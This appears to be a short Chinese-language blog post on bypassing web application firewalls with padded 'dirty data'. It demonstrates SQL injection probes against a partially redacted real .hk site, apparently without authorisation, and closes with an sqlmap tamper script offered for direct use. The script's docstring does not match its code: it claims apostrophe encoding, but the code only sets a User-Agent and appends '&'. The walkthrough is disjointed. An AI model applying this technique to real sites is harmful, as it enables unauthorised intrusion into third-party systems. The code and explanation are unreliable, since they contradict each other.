01关于脏数据  
  

脏数据其实就是因为填充大量的信息，超过了waf的判断长度，导致我们绕过了waf，也有另外一个原因， waf处理时间过长，于是直接丢给了后端

  

  

  

  

  

02实战演练  
  

  

首先让我们看到目标网站

http://xxxxxx.hk/newhouse/list.php?bid=48

第一眼看见就能想到一个东西就是sql注入

既然如此我们试一试，

http://xxxx.hk/newhouse/list.php?bid=48+order+by+1

返回，这时候我们就懵了，这是什么waf，于是不如我们截图然后使用谷歌图片搜索

```
#!/usr/bin/env python
"""Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE' for copying permission"""
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.LOWEST
def dependencies():    pass
def tamper(payload, **kwargs):    """    Replaces apostrophe character (') with its illegal double unicode counterpart (e.g. ' -> %00%27)
    >>> tamper("1 AND '1'='1")    '1 AND %00%271%00%27=%00%271'    """    headers = kwargs.get("headers", {})    headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"    zsj="&"    zsjone=payload+zsj
    return zsjone
```

执行即可
